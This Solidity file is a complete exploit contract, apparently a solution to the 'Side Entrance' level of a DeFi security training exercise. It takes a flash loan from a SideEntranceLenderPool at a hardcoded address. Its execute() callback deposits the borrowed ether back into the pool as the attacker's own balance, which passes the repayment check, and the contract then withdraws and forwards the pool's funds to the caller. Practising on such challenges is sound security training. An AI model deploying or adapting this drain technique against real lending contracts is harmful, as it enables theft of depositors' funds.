// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Level04-Contracts.sol";
import "../../OZ/utils/Address.sol";

contract Level04Attack {
    using Address for address payable;

    SideEntranceLenderPool lender = SideEntranceLenderPool(0x4402fb7A9f1fF651634A29BdA9CD0011678D6428);

    function attackLender() external {
        lender.flashLoan(1000 ether);
        lender.withdraw();
    }

    function execute() external payable {
        lender.deposit{value: msg.value}();
    }

    function withdraw() external {
        payable(msg.sender).sendValue(address(this).balance);
    }

    receive() external payable {}
}
